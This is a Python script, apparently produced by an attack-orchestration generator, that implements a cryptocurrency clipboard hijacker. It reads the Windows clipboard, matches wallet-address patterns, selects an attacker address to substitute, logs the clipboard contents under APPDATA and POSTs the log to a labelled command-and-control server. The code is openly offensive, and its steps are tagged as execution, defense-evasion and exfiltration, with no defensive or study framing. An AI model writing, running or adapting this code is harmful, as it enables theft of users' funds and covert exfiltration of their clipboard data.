#!/usr/bin/env python3
import sys
import json
import time
import re
import ctypes
from typing import Dict, Any
import os
import requests

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Define regex pattern for cryptocurrency addresses (simplified)
        crypto_patterns = [
            r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$',  # Bitcoin
            r'^0x[a-fA-F0-9]{40}$',                  # Ethereum
            r'^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$',   # Litecoin
        ]

        # Access clipboard content
        CF_TEXT = 1
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32

        user32.OpenClipboard(0)
        try:
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                handle = user32.GetClipboardData(CF_TEXT)
                data = ctypes.c_char_p(handle).value
                clipboard_content = data.decode('utf-8')
            else:
                clipboard_content = ''
        finally:
            user32.CloseClipboard()

        # Check if clipboard content matches any crypto pattern
        is_crypto = any(re.match(pattern, clipboard_content) for pattern in crypto_patterns)

        result = {
            'content': clipboard_content,
            'is_crypto': is_crypto
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'content': '', 'is_crypto': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extracting input data
        content = input_data.get('content', '')
        is_crypto = input_data.get('is_crypto', False)
        
        # Attacker-controlled replacement address
        attacker_address = "1AttackerAddressExample1234567890"

        # Initialize result dictionary
        result = {
            "replaced": False,
            "original": content,
            "replacement": ""
        }

        # Check if the content is a cryptocurrency address
        if is_crypto:
            result["replaced"] = True
            result["replacement"] = attacker_address

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result on failure
        return {'success': False, 'data': {'replaced': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract clipboard content and crypto status
        content = input_data.get('content', '')
        is_crypto = input_data.get('is_crypto', False)

        # Define the log file path
        log_directory = os.path.join(os.environ.get('APPDATA', ''), 'ClipboardLogs')
        os.makedirs(log_directory, exist_ok=True)
        log_path = os.path.join(log_directory, 'clipboard_log.txt')

        # Log the clipboard content
        with open(log_path, 'a', encoding='utf-8') as log_file:
            log_file.write(f"Content: {content}\n")
            log_file.write(f"Is Crypto: {is_crypto}\n")
            log_file.write(f"Timestamp: {time.ctime()}\n\n")

        result = {'log_path': log_path}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result with fallback value on failure
        return {'success': False, 'data': {'log_path': ''}, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        log_path = input_data.get('log_path', '')
        exfiltrated = False

        # Read the log file content
        with open(log_path, 'r') as log_file:
            log_content = log_file.read()

        # Define the C2 server URL
        c2_server_url = "https://192.168.62.58/api"

        # Send the log content to the C2 server
        response = requests.post(c2_server_url, data={'log_content': log_content}, timeout=10)

        # Check if the request was successful
        if response.status_code == 200:
            exfiltrated = True

        result = {'exfiltrated': exfiltrated}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'exfiltrated': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Monitor Clipboard [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Monitor Clipboard): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Monitor Clipboard): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Replace Crypto Address [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Replace Crypto Address): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Replace Crypto Address): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Log Clipboard Content [data-processing] ──
    try:
        r = task_T3(outputs.get('T1', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Log Clipboard Content): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Log Clipboard Content): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Exfiltrate Logs [exfiltration] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Exfiltrate Logs): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Exfiltrate Logs): FAILED — {err}')
            failed.append('T4')
            r2 = task_T4(outputs.get('T3', {}))
            if r2.get('success'):
                outputs['T4'] = r2.get('data', {})
                failed.remove('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))